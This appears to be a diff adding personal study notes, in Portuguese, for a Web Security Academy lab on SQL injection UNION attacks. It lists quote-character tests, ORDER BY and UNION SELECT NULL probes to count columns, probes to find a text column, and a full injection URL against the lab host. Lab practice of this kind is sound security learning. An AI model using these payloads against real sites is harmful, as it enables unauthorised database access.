@@ -1,0 +1,33 @@
+SQL injection UNION attack, finding a column containing text
+-----------------------------------------------------------
+Laboratório: https://aca61fb61e5c06b0c0135f69002f002c.web-security-academy.net
+
+Testar caracteres:
+    |-> '
+    |-> '#
+    |-> '--
+
+----------------------------------------------------------------
+
+Determinar as colunas das tabelas:
+    'ORDER BY 1--
+    'ORDER BY 2--
+    'ORDER BY 3--
+
+----------------------------------------------------------------
+Determinar as colunas do primeiro select
+    'UNION SELECT NULL--
+        |-> Internal Server Error
+    'UNION SELECT NULL, NULL--
+    'UNION SELECT NULL, NULL, NULL--
+
+-------------------------------
+
+Vamos fazer essas 3 injeções para saber qual é a do tipo texto.
+
+'UNION SELECT 'a', NULL, NULL--
+'UNION SELECT NULL, 'a', NULL--  |-> Essa é do tipo texto!
+'UNION SELECT NULL, NULL, 'a'--
+
+Não retorna erro:
+aca61fb61e5c06b0c0135f69002f002c.web-security-academy.net/filter?category='UNION SELECT 1, 'a', 1--
